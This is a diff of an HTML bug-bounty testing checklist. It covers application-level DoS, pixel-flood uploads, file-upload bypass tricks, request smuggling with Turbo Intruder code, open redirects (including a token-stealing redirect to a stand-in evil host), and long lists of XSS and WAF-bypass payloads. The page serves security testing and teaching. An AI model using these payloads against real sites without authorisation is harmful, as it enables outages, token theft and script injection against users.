+                    <h5>3.2) Denial of Service Based on Comparing the Measured Response Times and Triggering a 5XX
+                        Error:</h5>
+                    <p>This technique works for inputs that are not getting back in response and attacker wants to use
+                        server resources. Now most of programs don’t accept this kind of bug.</p>
+                    <p>By sending a very long string (100000 characters) it’s possible to cause a denial of service
+                        attack on the server. This may lead to the website becoming unavailable or unresponsive. Usually
+                        this problem is caused by a vulnerable string hashing implementation. When a long string is
+                        sent, the string hashing process will result in CPU and memory exhaustion.</p>
+                    <p>This vulnerability must be detected by sending strings with various lengths and comparing the
+                        measured response times. And you can confirm this vulnerability with 500 Internal Server Error.
+                    </p>
+                    <p>The most likely field is the password because we know that it is mostly stored as a hash on the
+                        server.</p>
+                    <p>By sending a very long password (1.000.000 characters) it's possible to cause a denial of service
+                        attack on the server. This may lead to the website becoming unavailable or unresponsive. Usually
+                        this problem is caused by a vulnerable password hashing implementation. When a long password is
+                        sent, the password hashing process will result in CPU and memory exhaustion.</p>
+
                     <p>You can find this at many places like:</p>
                     <ul>
                         <li>Username</li>
@@ -835,39 +1133,61 @@ print(f'Time: {time.time() - start}')
                         <li>Text-Area</li>
                         <li>Comment Section</li>
                     </ul>
-                    
+
                     <h5>Remediation:</h5>
                     <ul>
-                        <li>The password hashing implementation must be fixed to limit the maximum length of accepted passwords.</li>
-                        <li>As in most systems there is a policy for the minimum number of characters, this limit should also exist for the maximum number of characters.</li>
+                        <li>The password hashing implementation must be fixed to limit the maximum length of accepted
+                            passwords.</li>
+                        <li>As in most systems there is a policy for the minimum number of characters, this limit should
+                            also exist for the maximum number of characters.</li>
                     </ul>
-                    
+
                     <h5>How to Find This Vulnerability:</h5>
                     <ol>
-                        <li>Go to <a href="https://privateprogram.com/signup" target="_blank">https://privateprogram.com/signup</a></li>
+                        <li>Go to <a href="https://privateprogram.com/signup"
+                                target="_blank">https://privateprogram.com/signup</a></li>
                         <li>Fill the form and enter a long string in password</li>
                         <li>Click on enter and you’ll get 500 Internal Server error if it is vulnerable:</li>
                     </ol>
-                    <img src="https://user-images.githubusercontent.com/63053441/200264593-ec1cfb7c-2f1b-4c5d-9701-65d2c3e0beed.png" alt="500 Internal Server Error">
-                    
+                    <img src="https://user-images.githubusercontent.com/63053441/200264593-ec1cfb7c-2f1b-4c5d-9701-65d2c3e0beed.png"
+                        alt="500 Internal Server Error">
+
                     <h5>NOTES:</h5>
                     <ul>
-                        <li>Also you must check that you can login in program with that long password or not! (Is that password accepted from server?)</li>
-                        <li>Now many a times it happens that the signup page is not vulnerable to Long String Dos so you can try it while resetting your password.</li>
-                        <li>This DoS attack falls under the Application Level DoS and not Network Level DoS so you can report it. In some company’s policy of Out-Of-Scope, you’ll find “Denial of Service” which means Network Level DoS and not Application Level DoS. If the company has stated that “Any kind of DoS” is Out-Of-Scope that means you can’t report either of them.</li>
+                        <li>Also you must check that you can login in program with that long password or not! (Is that
+                            password accepted from server?)</li>
+                        <li>Now many a times it happens that the signup page is not vulnerable to Long String Dos so you
+                            can try it while resetting your password.</li>
+                        <li>This DoS attack falls under the Application Level DoS and not Network Level DoS so you can
+                            report it. In some company’s policy of Out-Of-Scope, you’ll find “Denial of Service” which
+                            means Network Level DoS and not Application Level DoS. If the company has stated that “Any
+                            kind of DoS” is Out-Of-Scope that means you can’t report either of them.</li>
                     </ul>
-                    
+
                     <h5>HackerOne Reports:</h5>
                     <ul>
-                        <li><a href="https://hackerone.com/reports/223854" target="_blank">https://hackerone.com/reports/223854</a></li>
-                        <li><a href="https://hackerone.com/reports/768677" target="_blank">https://hackerone.com/reports/768677</a></li>
-                        <li><a href="https://hackerone.com/reports/819088" target="_blank">https://hackerone.com/reports/819088</a></li>
+                        <li><a href="https://hackerone.com/reports/223854"
+                                target="_blank">https://hackerone.com/reports/223854</a></li>
+                        <li><a href="https://hackerone.com/reports/768677"
+                                target="_blank">https://hackerone.com/reports/768677</a></li>
+                        <li><a href="https://hackerone.com/reports/819088"
+                                target="_blank">https://hackerone.com/reports/819088</a></li>
                     </ul>
-                    
+
                     <h5>3.3) Denial of Service Based on Humongous Long String in Response:</h5>
-                    <p>Checking the existence of this vulnerability is the same as the previous methods. You should be able to send a large data to the server, but with the difference that this time you are not only looking for error 500 or an increase in data processing time, rather you are looking for an endpoint that executes your data and returns it in response. If this data is visible to a larger number of users, the impact of the vulnerability increases.</p>
-                    <p>For example, if the file name you upload in a forum is several thousand characters long and when other users opened that particular page they are forced to request the file name from the server, you have found a vulnerability that leads to restrict the access to that page.</p>
-                    <p>As it is known in this <a href="https://hackerone.com/reports/764434" target="_blank">report</a>, by placing the payload in the file name, the hacker caused problems for other users who requested a query to load the profile picture and their browser crashed. <a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/DOS/payload.txt" target="_blank">Payload Link with 3mg Size</a></p>
+                    <p>Checking the existence of this vulnerability is the same as the previous methods. You should be
+                        able to send a large data to the server, but with the difference that this time you are not only
+                        looking for error 500 or an increase in data processing time, rather you are looking for an
+                        endpoint that executes your data and returns it in response. If this data is visible to a larger
+                        number of users, the impact of the vulnerability increases.</p>
+                    <p>For example, if the file name you upload in a forum is several thousand characters long and when
+                        other users opened that particular page they are forced to request the file name from the
+                        server, you have found a vulnerability that leads to restrict the access to that page.</p>
+                    <p>As it is known in this <a href="https://hackerone.com/reports/764434" target="_blank">report</a>,
+                        by placing the payload in the file name, the hacker caused problems for other users who
+                        requested a query to load the profile picture and their browser crashed. <a
+                            href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/DOS/payload.txt"
+                            target="_blank">Payload Link with 3mg Size</a></p>
                 </div>
             </div>
 
@@ -875,8 +1195,14 @@ print(f'Time: {time.time() - start}')
             <div class="subcategory">
                 <h4><input type="checkbox" id="pixel-frame-flood"> Pixel Flood/Frame Flood Attack</h4>
                 <div class="steps content">
-                    <p>There are many ways to create a Denial-Of-Service attack but most of them end up as Informative or N/A. So there is an effective technique in which an image is uploaded in the profile photo that has the maximum pixel size of 64250px and gives you the time out, creating a DoS.</p>
-                    <p>The vulnerable application will load the pixel from the image file to the memory, and process the image in order to get a new image file such as resize, rotate, blur, etc. The attacker could manipulate the exif data in the image file such as change the image pixel to 64250 * 64250 pixels. If the vulnerable application loaded the crafted image, it tries to allocate 4128062500 pixels into memory.</p>
+                    <p>There are many ways to create a Denial-Of-Service attack but most of them end up as Informative
+                        or N/A. So there is an effective technique in which an image is uploaded in the profile photo
+                        that has the maximum pixel size of 64250px and gives you the time out, creating a DoS.</p>
+                    <p>The vulnerable application will load the pixel from the image file to the memory, and process the
+                        image in order to get a new image file such as resize, rotate, blur, etc. The attacker could
+                        manipulate the exif data in the image file such as change the image pixel to 64250 * 64250
+                        pixels. If the vulnerable application loaded the crafted image, it tries to allocate 4128062500
+                        pixels into memory.</p>
                     <h5>How to Find This Vulnerability:</h5>
                     <ol>
                         <li>Go to your target website and upload a profile photo</li>
@@ -884,26 +1210,40 @@ print(f'Time: {time.time() - start}')
                         <li>Select the file and upload it</li>
                         <li>After uploading just check the response you’ll get a timeout error</li>
                     </ol>
-                    <img src="https://user-images.githubusercontent.com/63053441/200397507-fc8b543f-a424-4014-b50a-75e5985f3288.png" alt="Pixel Flood Attack">
-                    <p>Here the service is trying to convert the image once uploaded, by loading the 'whole image' into memory. It tries to allocate 4128062500 pixels into memory, flooding the memory and causing DoS.</p>
+                    <img src="https://user-images.githubusercontent.com/63053441/200397507-fc8b543f-a424-4014-b50a-75e5985f3288.png"
+                        alt="Pixel Flood Attack">
+                    <p>Here the service is trying to convert the image once uploaded, by loading the 'whole image' into
+                        memory. It tries to allocate 4128062500 pixels into memory, flooding the memory and causing DoS.
+                    </p>
                     <p>Also, you can confirm this vulnerability with two accounts:</p>
                     <ul>
                         <li>From Account 1 try to send 64K * 64K resolution image</li>
-                        <li>Simultaneously from Account 2 try to send normal image (with different Internet Connection).</li>
+                        <li>Simultaneously from Account 2 try to send normal image (with different Internet Connection).
+                        </li>
                         <li>You should see that the process of uploading with the account 2 is smooth (E.g got 502)</li>
                     </ul>
-                    <p>In some cases, the website doesn’t allow you to upload the 64250*64250px images due to security, so you need to bypass it. Bypassing is very simple just replace the "64250*64250px" value with 0xfafa * 0xfafa this is equivalent to 64250 in Decimal number system and its binary format is 1111101011111010.</p>
-                    <p>You can make your own image <a href="https://www.resizepixel.com/" target="_blank">here</a> or download a crafted image from the attachment <a href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/raw/main/DOS/lottapixel.jpg" target="_blank">lottapixel.jpg</a></p>
+                    <p>In some cases, the website doesn’t allow you to upload the 64250*64250px images due to security,
+                        so you need to bypass it. Bypassing is very simple just replace the "64250*64250px" value with
+                        0xfafa * 0xfafa this is equivalent to 64250 in Decimal number system and its binary format is
+                        1111101011111010.</p>
+                    <p>You can make your own image <a href="https://www.resizepixel.com/" target="_blank">here</a> or
+                        download a crafted image from the attachment <a
+                            href="https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/raw/main/DOS/lottapixel.jpg"
+                            target="_blank">lottapixel.jpg</a></p>
                     <h5>Remediation:</h5>
                     <ul>
-                        <li>Just set a maximum amount of pixels an image can have and check it before any processing.</li>
+                        <li>Just set a maximum amount of pixels an image can have and check it before any processing.
+                        </li>
                         <li>Instructing to run validations before starting the resizing or any process.</li>
                     </ul>
                     <h5>HackerOne Reports:</h5>
                     <ul>
-                        <li><a href="https://hackerone.com/reports/390" target="_blank">https://hackerone.com/reports/390</a></li>
-                        <li><a href="https://hackerone.com/reports/400" target="_blank">https://hackerone.com/reports/400</a></li>
-                        <li><a href="https://hackerone.com/reports/842462" target="_blank">https://hackerone.com/reports/842462</a></li>
+                        <li><a href="https://hackerone.com/reports/390"
+                                target="_blank">https://hackerone.com/reports/390</a></li>
+                        <li><a href="https://hackerone.com/reports/400"
+                                target="_blank">https://hackerone.com/reports/400</a></li>
+                        <li><a href="https://hackerone.com/reports/842462"
+                                target="_blank">https://hackerone.com/reports/842462</a></li>
                     </ul>
                 </div>
             </div>
@@ -915,8 +1255,10 @@ print(f'Time: {time.time() - start}')
                     <pre><code class="language-php">
 https://target.com/index.php?param1=xxxxxxxxxxxxxx
                     </code></pre>
-                    <p>After input "xxxxxxxxxxxxxx" as a value of param1, check your cookies. If there are cookies the value is "xxxxxxxxxxxxxxxxxxxxxx" it means the website is vulnerable.</p>
-                    <p>Try input a very long payload to form. For example using a very long password or using a very long email:</p>
+                    <p>After input "xxxxxxxxxxxxxx" as a value of param1, check your cookies. If there are cookies the
+                        value is "xxxxxxxxxxxxxxxxxxxxxx" it means the website is vulnerable.</p>
+                    <p>Try input a very long payload to form. For example using a very long password or using a very
+                        long email:</p>
                     <pre><code class="language-php">
 POST /register HTTP/1.1
 Host: target.com
@@ -926,17 +1268,22 @@ username=victim&password=aaaaaaaaaaaaaaa
                     </code></pre>
                     <h5>References:</h5>
                     <ul>
-                        <li><a href="https://www.acunetix.com/vulnerabilities/web/long-password-denial-of-service/" target="_blank">https://www.acunetix.com/vulnerabilities/web/long-password-denial-of-service/</a></li>
-                        <li><a href="https://shahjerry33.medium.com/long-string-dos-6ba8ceab3aa0" target="_blank">https://shahjerry33.medium.com/long-string-dos-6ba8ceab3aa0</a></li>
-                        <li><a href="https://cwe.mitre.org/data/definitions/400.html" target="_blank">https://cwe.mitre.org/data/definitions/400.html</a></li>
+                        <li><a href="https://www.acunetix.com/vulnerabilities/web/long-password-denial-of-service/"
+                                target="_blank">https://www.acunetix.com/vulnerabilities/web/long-password-denial-of-service/</a>
+                        </li>
+                        <li><a href="https://shahjerry33.medium.com/long-string-dos-6ba8ceab3aa0"
+                                target="_blank">https://shahjerry33.medium.com/long-string-dos-6ba8ceab3aa0</a></li>
+                        <li><a href="https://cwe.mitre.org/data/definitions/400.html"
+                                target="_blank">https://cwe.mitre.org/data/definitions/400.html</a></li>
                         <li><a href="https://www.firewall.cx/" target="_blank">https://www.firewall.cx/</a></li>
-                        <li><a href="https://shahjerry33.medium.com/dos-mr-pixel-flood-27605add29f2" target="_blank">https://shahjerry33.medium.com/dos-mr-pixel-flood-27605add29f2</a></li>
+                        <li><a href="https://shahjerry33.medium.com/dos-mr-pixel-flood-27605add29f2"
+                                target="_blank">https://shahjerry33.medium.com/dos-mr-pixel-flood-27605add29f2</a></li>
                     </ul>
                 </div>
             </div>
         </div>
-    </div>
-    <!-- File Upload Category -->
+        </div>
+        <!-- File Upload Category -->
         <div class="category">
             <h3><input type="checkbox" id="file-upload">8 > File Upload</h3>
             <div class="subcategory">
@@ -1015,38 +1362,42 @@ username=victim&password=aaaaaaaaaaaaaaa
                     <p><strong>Open Redirect:</strong></p>
                     <p>Upload using .svg file with redirect payload.</p>
                 </div>
-pre {
-            background: #eee;
-            padding: 10px;
-            border-radius: 5px;
-            overflow-x: auto;
-        }
+                pre {
+                background: #eee;
+                padding: 10px;
+                border-radius: 5px;
+                overflow-x: auto;
+                }
                 <h4><input type="checkbox" id="upload-tricks"> Upload Tricks</h4>
                 <div class="steps">
                     <p>Use double extensions: .jpg.php, .png.php5</p>
                     <p>Use reverse double extension: .php.jpg</p>
                     <p>Random uppercase and lowercase: .pHp, .pHP5, .PhAr</p>
                     <p>Null byte: .php%00.gif</p>
-                    <p>Special characters: Multiple dots, whitespace, new line, RTLO, slash, multiple special characters.</p>
+                    <p>Special characters: Multiple dots, whitespace, new line, RTLO, slash, multiple special
+                        characters.</p>
                 </div>
 
                 <h4><input type="checkbox" id="references"> References</h4>
                 <div class="references">
-                    <p><a href="https://github.com/HolyBugx/HolyTips/blob/main/Checklist/File%20Upload.md" target="_blank">File Upload Checklist</a></p>
-                    <p><a href="https://book.hacktricks.xyz/pentesting-web/file-upload" target="_blank">HackTricks File Upload</a></p>
-                    <p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" target="_blank">PayloadsAllTheThings</a></p>
+                    <p><a href="https://github.com/HolyBugx/HolyTips/blob/main/Checklist/File%20Upload.md"
+                            target="_blank">File Upload Checklist</a></p>
+                    <p><a href="https://book.hacktricks.xyz/pentesting-web/file-upload" target="_blank">HackTricks File
+                            Upload</a></p>
+                    <p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/"
+                            target="_blank">PayloadsAllTheThings</a></p>
                 </div>
             </div>
         </div>
-        
-        
+
+
         <!-- Http Request Smuggling -->
         <div class="category">
             <h3><input type="checkbox" id="file-upload">9 > Http Request Smuggling</h3>
             <div class="subcategory">
                 <h4><input type="checkbox" id="upload-function"> Sample HTTP Request:</h4>
                 <div class="steps">
-                  <pre>
+                    <pre>
 POST /login HTTP/1.1
 Host: staging-login.newrelic.com
 Connection: keep-alive
@@ -1094,8 +1445,8 @@ GET https://**YOUR_COLLAB_URL**/ HTTP/1.1
 X: X
             </pre>
 
-            <h3><input type="checkbox"> Turbo Intruder Code:</h3>
-            <pre>
+                    <h3><input type="checkbox"> Turbo Intruder Code:</h3>
+                    <pre>
 def queueRequests(target, wordlists):
     engine = RequestEngine(endpoint='https://staging-login.newrelic.com:443',
                            concurrentConnections=5,
@@ -1131,29 +1482,34 @@ x='''
     engine.start()
             </pre>
 
-            <h3><input type="checkbox" id="references"> References:</h3>
-            <ul>
-                <li><a href="https://hackerone.com/reports/726773">HackerOne Report 726773</a></li>
-                <li><a href="https://hackerone.com/reports/498052">HackerOne Report 498052</a></li>
-                <li><a href="https://hackerone.com/reports/771666">HackerOne Report 771666</a></li>
-            </ul>
-        </div>
-    </div>
-    
-     <!-- Open Redirect Category -->
-        <div class="category">
-            <h3><input type="checkbox" id="open-redirect">10 > Open Redirect</h3>
-            <div class="subcategory">
-                <h4><input type="checkbox" id="what-are-open-redirects"> What Are Open Redirects?</h4>
-                <div class="steps">
-                    <p>Open redirects are URLs that redirect users from one site to another, such as <code>https://www.example.com/?go=https://www.google.com/</code>. They can redirect users from example.com to google.com.</p>
-                    <p>They typically involve parameters like <code>returnUrl</code> that redirect users after an action, such as logging in. These are often considered low impact but can be leveraged for SSRF attacks and other high-impact exploits.</p>
+                    <h3><input type="checkbox" id="references"> References:</h3>
+                    <ul>
+                        <li><a href="https://hackerone.com/reports/726773">HackerOne Report 726773</a></li>
+                        <li><a href="https://hackerone.com/reports/498052">HackerOne Report 498052</a></li>
+                        <li><a href="https://hackerone.com/reports/771666">HackerOne Report 771666</a></li>
+                    </ul>
                 </div>
-                
-                <h4><input type="checkbox" id="finding-open-redirects"> Finding Open Redirects</h4>
-                <div class="steps">
-                    <p>Start with Google dorking using queries like:</p>
-                    <pre>inurl:go
+            </div>
+
+            <!-- Open Redirect Category -->
+            <div class="category">
+                <h3><input type="checkbox" id="open-redirect">10 > Open Redirect</h3>
+                <div class="subcategory">
+                    <h4><input type="checkbox" id="what-are-open-redirects"> What Are Open Redirects?</h4>
+                    <div class="steps">
+                        <p>Open redirects are URLs that redirect users from one site to another, such as
+                            <code>https://www.example.com/?go=https://www.google.com/</code>. They can redirect users
+                            from example.com to google.com.
+                        </p>
+                        <p>They typically involve parameters like <code>returnUrl</code> that redirect users after an
+                            action, such as logging in. These are often considered low impact but can be leveraged for
+                            SSRF attacks and other high-impact exploits.</p>
+                    </div>
+
+                    <h4><input type="checkbox" id="finding-open-redirects"> Finding Open Redirects</h4>
+                    <div class="steps">
+                        <p>Start with Google dorking using queries like:</p>
+                        <pre>inurl:go
 inurl:return
 inurl:r_url
 inurl:returnUrl
@@ -1161,29 +1517,34 @@ inurl:returnUri
 inurl:locationUrl
 inurl:goTo
 inurl:return_url</pre>
-                    <p>Also explore parameters used in actions like login, logout, and signup. Check JavaScript files for redirect parameters.</p>
-                </div>
-                
-                <h4><input type="checkbox" id="using-open-redirects"> Using Open Redirects</h4>
-                <div class="steps">
-                    <h5>1. Grab Tokens via Misconfigured Apps/Login Flows</h5>
-                    <p>Example: <code>returnto=/supersecure</code> might redirect to <code>/supersecure?token=39e9334a</code>. Change to <code>returnto=//myevilsite.com</code> to steal tokens.</p>
-                    
-                    <h5>2. Bypassing Blacklists for SSRF/RCE</h5>
-                    <p>Use open redirects to bypass restrictions. Example: <code>?url=/example</code> can be pointed to <code>/redirect?goto=//127.0.0.1/</code>.</p>
-                    
-                    <h5>3. XSS via JavaScript</h5>
-                    <p>If redirection uses JavaScript, try:</p>
-                    <b>use view page source to check what to use </b>
-                   <!-- <pre>< script>
+                        <p>Also explore parameters used in actions like login, logout, and signup. Check JavaScript
+                            files for redirect parameters.</p>
+                    </div>
+
+                    <h4><input type="checkbox" id="using-open-redirects"> Using Open Redirects</h4>
+                    <div class="steps">
+                        <h5>1. Grab Tokens via Misconfigured Apps/Login Flows</h5>
+                        <p>Example: <code>returnto=/supersecure</code> might redirect to
+                            <code>/supersecure?token=39e9334a</code>. Change to <code>returnto=//myevilsite.com</code>
+                            to steal tokens.
+                        </p>
+
+                        <h5>2. Bypassing Blacklists for SSRF/RCE</h5>
+                        <p>Use open redirects to bypass restrictions. Example: <code>?url=/example</code> can be pointed
+                            to <code>/redirect?goto=//127.0.0.1/</code>.</p>
+
+                        <h5>3. XSS via JavaScript</h5>
+                        <p>If redirection uses JavaScript, try:</p>
+                        <b>use view page source to check what to use </b>
+                        <!-- <pre>< script>
 top.location.href='reflectedhere';
 </ script></pre> -->
-                    <p>Encode values correctly, using normal and double encoding:</p>
-                    <pre>https://example.com/login?return=https://example.com/?returnurl=https%3A%2F%2Fwww.google.com%2F
+                        <p>Encode values correctly, using normal and double encoding:</p>
+                        <pre>https://example.com/login?return=https://example.com/?returnurl=https%3A%2F%2Fwww.google.com%2F
 https://example.com/login?return=https%3A%2F%2Fexample.com%2F%3Freturnurl%3Dhttps%253A%252F%252Fwww.google.com%252F</pre>
-                    
-                    <h5>Payloads</h5>
-                    <pre>\/yoururl.com 
+
+                        <h5>Payloads</h5>
+                        <pre>\/yoururl.com 
 \/\/yoururl.com 
 \\yoururl.com 
 //yoururl.com 
@@ -1200,17 +1561,18 @@ https://theirsite.com.mysite.com
 /%2F/yoururl.com 
 /%5Cyoururl.com 
 //google%E3%80%82com</pre>
-                    <p>Use <a href="https://tools.intigriti.io/redirector/" target="_blank">this tool</a> to generate payloads.</p>
+                        <p>Use <a href="https://tools.intigriti.io/redirector/" target="_blank">this tool</a> to
+                            generate payloads.</p>
+                    </div>
                 </div>
             </div>
-        </div>
-        
-         <!-- XSS Payloads Category -->
-        <div class="category">
-            <h3><input type="checkbox" id="xss-payloads">11 > XSS Payloads</h3>
-            <div class="subcategory">
-                <h4>1. If you cannot escape from the attribute (" is being encoded or deleted)</h4>
-                <pre><code>
+
+            <!-- XSS Payloads Category -->
+            <div class="category">
+                <h3><input type="checkbox" id="xss-payloads">11 > XSS Payloads</h3>
+                <div class="subcategory">
+                    <h4>1. If you cannot escape from the attribute (" is being encoded or deleted)</h4>
+                    <pre><code>
 1) &lt;a href="javascript:alert(1)"&gt;Click&lt;/a&gt;
 
 2) &lt;a href="&#01;javascript:alert(1)"&gt;Click&lt;/a&gt;
@@ -1219,13 +1581,14 @@ https://theirsite.com.mysite.com
 
 4) &lt;a src="google.com" onclick="alert(1)"&gt;Click&lt;/a&gt;
                 </code></pre>
-                <p>Or try to replace " with \u0022, > with \u003e and < with \u003c. So the payload will be:</p>
-                <pre><code>
+                    <p>Or try to replace " with \u0022, > with \u003e and < with \u003c. So the payload will be:</p>
+                            <pre><code>
 4) \u0022\u003e\u003cimg src=x onerror=alert(1)\u003e\u003cx y=\u0022
                 </code></pre>
 
-                <h4>2. If you can escape from the attribute but not from the tag (> is encoded or deleted)</h4>
-                <pre><code>
+                            <h4>2. If you can escape from the attribute but not from the tag (> is encoded or deleted)
+                            </h4>
+                            <pre><code>
 1) &lt;input   value"XXXXXXX"   onclick=alert(1)  &gt;Click&lt;/input&gt;
 
 2) &lt;input  type:"text" value="XSS"  accesskey="x" onclick="alert(1)" &gt;
@@ -1236,8 +1599,8 @@ https://theirsite.com.mysite.com
 
 5) &lt;a  href=https://google.com onclick=alert(document.location.hash.substring(1))#{saasasasas}&gt;Click&lt;/a&gt;
                 </code></pre>
-                <p>Or use encodes:</p>
-                <pre><code>
+                            <p>Or use encodes:</p>
+                            <pre><code>
 Use Unicodes - UTF8 - UTF16 - UTF32
 %3cscript%3e
 %253cscript%253e
@@ -1252,8 +1615,8 @@ Burp Suite &gt; Convert Selection &gt; HTML &gt; HTML-encode all character
 &lt;&#97;&#32;&#104;&#114;&#101;&#102;&#61;&quot;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;&gt;&#67;&#108;&#105;&#99;&#107;&lt;&#47;&#97;&gt;
                 </code></pre>
 
-                <h4>3. If alert is encoded or deleted</h4>
-                <pre><code>
+                            <h4>3. If alert is encoded or deleted</h4>
+                            <pre><code>
 1) &lt;script&gt;$='',_=!$+$,$$=!_+$,$_=$+{},_$=_[$++],__=_[_$$=$],_$_=++_$$+$,$$$=$_[_$$+_$_],_[$$$+=$_[$]+(_.$$+$_)[$]+$$[_$_]+_$+__+_[_$$]+$$$+_$+$_[$]+__][$$$]($$[$]+$$[_$$]+_[_$_]+__+_$+"($)")()&lt;/script&gt;
 
 2) &lt;script&gt;[[,$,_,$$,__,$_,_$,$$$,$__,,___]=[![]+[]+!![]][+[]]+[][[]]],$$_=[][$+$_],[,,,$_$,,,_$$,,,,,__$,_$_]=[...$$_+[]],$_$+_$$+___+$$+$_+_$+$$$+$_$+$_+_$$+_$$$_[$_$+_$$+___+$$+$_+_$+$$$+$_$+$_+_$$+_$]($+_+__+_$+$_+__$+[+!!$]+_$_)()&lt;/script&gt;
@@ -1304,24 +1667,24 @@ Burp Suite &gt; Convert Selection &gt; HTML &gt; HTML-encode all character
 16) &lt;form&gt;&lt;button formaction=http://14.rs&gt;Hacked&lt;/form&gt;
                 </code></pre>
 
-                <h4>4. If space is encoded or deleted</h4>
-                <pre><code>
+                            <h4>4. If space is encoded or deleted</h4>
+                            <pre><code>
 Use tab url encode : %09
 &lt;input%09value"XXXXXXX"%09onclick=alert(1)&gt;Click&lt;/input&gt;
                 </code></pre>
 
-                <h4>5. If () is encoded or deleted</h4>
-                <pre><code>
+                            <h4>5. If () is encoded or deleted</h4>
+                            <pre><code>
 &lt;script&gt;alert`1`&lt;/script&gt;
                 </code></pre>
 
-                <h4>6. If &lt;script&gt; is encoded or deleted try other tags like:</h4>
-                <pre><code>
+                            <h4>6. If &lt;script&gt; is encoded or deleted try other tags like:</h4>
+                            <pre><code>
 SVG, img, iframe 
                 </code></pre>
-                
-                <h4>7. Some WAF bypass:</h4>
-                <pre><code>
+
+                            <h4>7. Some WAF bypass:</h4>
+                            <pre><code>
 @vanshitmalhotra | Bypass AWS WAF -// 
 Add "&lt;!" (without quotes) before your payload and bypass that WAF. :)
 eg: &lt;!&lt;script&gt;confirm(1)&lt;/script&gt;
@@ -1358,164 +1721,220 @@ rodolfoassis | ModSecurity CRS 3.2.0 PL1
 &lt;img src=x onerror=this.innerHTML=String.fromCharCode(60,105,109,103,32,115,114,99,61,39,120,39,32,111,110,101,114,114,111,114,61,39,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41,59,39,62)
                 </code></pre>
 
-                <h4>8. Some good stuff:</h4>
-                <pre><code>
+                            <h4>8. Some good stuff:</h4>
+                            <pre><code>
 https://github.com/Walidhossain010/WAF-bypass-xss-payloads
 https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057
                 </code></pre>
 
-                <h4>9. XSS PolyglotsPolice: revolving allow you to test multiple XSS scenarios with ONE payload. Work smarter not harder:</h4>
-                <img src="https://user-images.githubusercontent.com/63053441/148800150-58f87374-41ad-4ea8-8887-510c652c7452.jpg" alt="XSS PolyglotsPolice">
-                <pre><code>
+                            <h4>9. XSS PolyglotsPolice: revolving allow you to test multiple XSS scenarios with ONE
+                                payload. Work smarter not harder:</h4>
+                            <img src="https://user-images.githubusercontent.com/63053441/148800150-58f87374-41ad-4ea8-8887-510c652c7452.jpg"
+                                alt="XSS PolyglotsPolice">
+                            <pre><code>
 -->'"/&gt;&lt;/sCript&gt;&lt;deTailS open x="&gt;" ontoggle=(co\u006efirm)``&gt;
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/&gt;--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;
                 </code></pre>
+                </div>
             </div>
-        </div>
-        
-        
-        <!-- Web Cache Deception Category -->
-        <div class="category">
-            <h3><input type="checkbox" id="web-cache-deception">12 > Web Cache Deception</h3>
-            <div class="subcategory">
-                <h4>Summary</h4>
-                <p>Web Cache Deception (WCD) is an attack in which an attacker deceives a caching proxy into improperly storing private information sent over the internet and gaining unauthorized access to that cached data. It was proposed by Omer Gil, a security researcher in 2017.</p>
-                
-                <h4>How does web cache deception attack work?</h4>
-                <p>When the browser makes a request to a website, the connection usually passes through the CDNs (Content Delivery Network).</p>
-                <p>CDNs are a geographically distributed network of proxy servers and their data centers, which caches the local copies of web content to provide faster access to the users by reducing their network latency, and thus reducing the load on web servers.</p>
-                <p>Caching servers have no safeguards to authenticate users and prevent information, and it only stores non-user specific static or public content. And all the user-specific dynamic contents get routed to the main servers of the website or service a user interacts with.</p>
-                <p>The web caching deception (WCD) attack works by the technique of path confusion attack.</p>
-                <p>It manipulates the URL path by which the cache server is forced to store, and the sensitive data gets revealed as public content.</p>
 
-                <p align="center">
-                    <img src="https://github.com/cyspad/my-share-image-repo/blob/88b8e4be9bfed88a2f2b542a97970619735b02eb/wcd-background.png?raw=true">
-                </p>
 
-                <h4>Simple Manual Testing</h4>
-                <pre>
+            <!-- Web Cache Deception Category -->
+            <div class="category">
+                <h3><input type="checkbox" id="web-cache-deception">12 > Web Cache Deception</h3>
+                <div class="subcategory">
+                    <h4>Summary</h4>
+                    <p>Web Cache Deception (WCD) is an attack in which an attacker deceives a caching proxy into
+                        improperly storing private information sent over the internet and gaining unauthorized access to
+                        that cached data. It was proposed by Omer Gil, a security researcher in 2017.</p>
+
+                    <h4>How does web cache deception attack work?</h4>
+                    <p>When the browser makes a request to a website, the connection usually passes through the CDNs
+                        (Content Delivery Network).</p>
+                    <p>CDNs are a geographically distributed network of proxy servers and their data centers, which
+                        caches the local copies of web content to provide faster access to the users by reducing their
+                        network latency, and thus reducing the load on web servers.</p>
+                    <p>Caching servers have no safeguards to authenticate users and prevent information, and it only
+                        stores non-user specific static or public content. And all the user-specific dynamic contents
+                        get routed to the main servers of the website or service a user interacts with.</p>
+                    <p>The web caching deception (WCD) attack works by the technique of path confusion attack.</p>
+                    <p>It manipulates the URL path by which the cache server is forced to store, and the sensitive data
+                        gets revealed as public content.</p>
+
+                    <p align="center">
+                        <img
+                            src="https://github.com/cyspad/my-share-image-repo/blob/88b8e4be9bfed88a2f2b542a97970619735b02eb/wcd-background.png?raw=true">
+                    </p>
+
+                    <h4>Simple Manual Testing</h4>
+                    <pre>
 1) First check caching with non-existent static files in paths (https://target.tld/profile/payments/nonexistent.css)
 2) If the response is not 404 and payments information is still displayed, the attack scenario is applicable
                 </pre>
 
-                <h4>How to test Web Cache Deception with BurpSuite</h4>
-                <pre>
+                    <h4>How to test Web Cache Deception with BurpSuite</h4>
+                    <pre>
 1) Install Web Cache Deception Scanner Extension in Burp Suite
 2) Select Target (Target Tab in Burp Suite)
 3) Right Click --> Extensions --> Web Cache Deception Scanner -> Web Cache Deception Test
                 </pre>
-                
-                <p align="center">
